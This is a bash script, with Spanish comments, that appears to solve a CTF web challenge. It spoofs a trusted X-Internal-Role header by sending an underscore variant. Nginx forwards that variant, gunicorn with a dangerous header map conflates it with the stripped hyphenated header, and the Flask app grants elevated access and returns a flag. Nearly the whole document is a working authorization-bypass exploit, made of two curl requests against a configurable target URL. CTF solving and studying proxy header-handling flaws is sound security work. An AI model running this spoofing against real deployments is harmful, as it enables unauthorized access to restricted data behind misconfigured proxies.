#!/bin/bash
# Under The Score (Fluid Attacks CTF 2026, API) -- header spoofing por conflation guion/guion_bajo.
# Uso:    ./header_underscore_spoof.sh <base_url> [endpoint] [header_name] [valor]
# Ejemplo: ./header_underscore_spoof.sh https://<host>.chal.ctf.ae /api/report X-Internal-Role auditor
#
# nginx pisa el header de confianza con guiones (proxy_set_header X-Internal-Role ""), pero con
# underscores_in_headers on reenvia la variante con guion_bajo (X_Internal_Role). gunicorn con
# --header-map dangerous conflaciona ambos a HTTP_X_INTERNAL_ROLE -> la app Flask lee el inyectado.
# Ref: gunicorn issue #2799.

BASE="${1:-https://127.0.0.1}"
EP="${2:-/api/report}"
HDR="${3:-X-Internal-Role}"
VAL="${4:-auditor}"
HDR_US="${HDR//-/_}"      # version con guion_bajo
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

echo "[*] 1) Header normal (con guiones) -> lo pisa nginx (control):"
curl -sk -A "$UA" -H "$HDR: $VAL" "$BASE$EP"; echo

echo "[*] 2) Header con guion_bajo ($HDR_US) -> nginx lo reenvia, gunicorn lo conflaciona:"
curl -sk -A "$UA" -H "$HDR_US: $VAL" "$BASE$EP"; echo
#   -> "restricted_note":"...FLAG{...}"
